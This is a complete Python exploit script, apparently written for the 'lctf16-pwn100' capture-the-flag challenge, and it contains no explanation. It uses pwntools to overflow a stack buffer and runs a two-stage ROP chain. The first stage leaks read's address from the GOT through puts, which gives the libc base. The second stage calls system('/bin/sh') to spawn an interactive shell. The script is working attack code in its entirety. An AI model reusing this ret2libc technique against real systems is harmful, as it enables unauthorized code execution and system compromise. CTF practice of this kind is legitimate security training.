from pwn import *
from LibcSearcher import *


io = process("../ex1-rop/lctf16-pwn100")
# gdb.attach(io)
elf = ELF("../ex1-rop/lctf16-pwn100")
pop_rdi = 0x400763
ret = 0x4004e1
read_got = elf.got['read']
main_addr = 0x4006B8
puts_plt = elf.symbols['puts']

payload1 = cyclic(0x48)
payload1 += p64(pop_rdi) + p64(read_got) + p64(puts_plt)
payload1 += p64(main_addr)
payload1 = payload1.ljust(200, b'a')

io.send(payload1)
io.recvuntil(b'bye~\n')
read_addr = io.recv(6).ljust(8, b'\x00')
read_real_addr = u64(read_addr)


# libc = LibcSearcher('read', read_real_addr)
# libcbase = read_real_addr - libc.dump('read')
# system_addr = libcbase + libc.dump('system')
# bin_sh = libcbase + libc.dump("str_bin_sh")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libcbase = read_real_addr - libc.symbols['read']
system_addr = libcbase + libc.symbols['system']
bin_sh = libcbase + next(libc.search(b'/bin/sh'))

payload2 = cyclic(0x48) + p64(ret)
payload2 += p64(pop_rdi) + p64(bin_sh) + p64(system_addr)
payload2 = payload2.ljust(200, b'a')

io.send(payload2)
io.interactive()
